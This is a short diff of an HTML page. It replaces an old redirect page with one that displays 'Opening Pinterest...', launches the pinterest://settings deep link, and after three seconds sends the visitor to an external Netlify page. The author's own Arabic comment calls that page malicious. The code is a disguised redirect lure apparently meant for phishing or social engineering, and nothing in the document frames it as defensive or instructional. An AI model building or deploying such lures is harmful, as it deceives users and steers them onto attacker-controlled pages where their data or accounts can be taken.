@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
   <head>
     <title>Redirecting...</title>
@@ -24,4 +24,27 @@
 </html>
 
 
-ظبط ده برده
+ظبط ده برده -->
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Opening app...</title>
+    <meta charset="UTF-8" />
+    <script>
+      window.onload = function () {
+        // افتح شاشة البيانات في تطبيق Pinterest
+        window.location = "pinterest://settings";
+
+        // بعد 3 ثواني ارجع لصفحتك الضارة
+        setTimeout(() => {
+          window.location = "https://astonishing-ganache-ed3660.netlify.app/arc.html";
+        }, 3000);
+      };
+    </script>
+  </head>
+  <body>
+    <p>Opening Pinterest...</p>
+  </body>
+</html>
